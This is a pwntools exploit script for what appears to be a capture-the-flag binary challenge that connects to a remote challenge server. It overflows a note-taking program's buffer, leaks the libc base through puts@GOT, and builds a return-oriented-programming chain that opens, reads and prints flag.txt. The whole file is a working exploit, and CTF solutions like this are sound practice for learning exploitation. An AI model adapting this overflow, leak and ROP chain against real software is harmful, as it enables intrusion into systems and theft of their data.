from pwn import *

elf = ELF('./chal')
#context.binary = './chal'
context.log_level = 'debug'

libc = ELF("./libc.so.6")
#libc.address = 140737351532544  # To be found 140737351811072

#p = process("./chal")
#p = process(['ld-linux-x86-64.so.2', './chal'], env={"LD_PRELOAD": './libc.so.6'})

p = remote('nc.asrctf.online', 21302)
# Create 64 notes
def start():
    count = 0
    for i in range(64):
        p.recvuntil(">")
        sleep(0.1)
        p.sendline("1")
        p.recvuntil(">")
        sleep(0.1)
        p.sendline("")
        p.recvuntil(">")
        sleep(0.1)
        p.sendline("")
        count += 1

    p.recvuntil(">")
    sleep(0.1)
    p.sendline("1")

    p.recvuntil(">")
    sleep(0.1)
    p.sendline("")

POP_RDI = 0x4011ca
POP_RSI = 0x4011cc
BSS = 0x404080

def get_flag():
    start()

    payload = b"A" * 56
    payload += p64(POP_RDI)

    payload += p64(BSS)

    # 0x0000000000043c43: pop rax; ret; 
    # 0x0000000000045c63: mov qword ptr [rdi], rax; xor eax, eax; ret;

    payload += p64(libc.address + 0x43c43)
    
    payload += b'flag.txt'
    payload += p64(libc.address + 0x4066f)

    payload += p64(POP_RSI)
    payload += p64(0)

    payload += p64(libc.symbols["open"])

    # 0x000000000008f0c5: pop rdx; pop rbx; ret;
    ## 0x00000000001a10b4: pop rdx; add rdi, rsi; xor eax, eax; cmp rdx, rsi; cmova rax, rdi; ret; 
    payload += p64(libc.address + 0x8f0c5)

    payload += p64(48)
    payload += p64(67)

    payload += p64(POP_RDI)
    payload += p64(3)

    payload += p64(POP_RSI)

    payload += p64(BSS)

    payload += p64(libc.symbols["read"])

    payload += p64(libc.address + 0x8f0c5)
    payload += p64(48)
    payload += p64(67)

    payload += p64(POP_RDI)
    payload += p64(1)

    payload += p64(POP_RSI)
    payload += p64(BSS)

    payload += p64(libc.symbols["write"])

    p.recvuntil(">")
    sleep(0.1)
    
    pause()
    p.sendline(payload)

    p.recvuntil(">")
    sleep(0.1)
    p.sendline("5")

    p.interactive()

def leak_libc():
    start()

    payload = b"A" * 56

    payload += p64(POP_RDI)
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload +=  p64(elf.symbols['notebookSM'])

    p.recvuntil(">")
    sleep(0.1)
    p.sendline(payload)

    p.recvuntil(">")
    sleep(0.1)
    p.sendline("5")

    p.recvuntil(b"Exitting!\n")
    raw = p.recv(6) # Parse leak from 6 bytes
    log.info(f"raw leak: {raw}")
    leak = u64(raw.ljust(8, b"\x00"))
    log.success(hex(leak))
    libc_base = leak - libc.symbols["puts"]
    
    print(libc_base)
    libc.address = libc_base

leak_libc()
get_flag()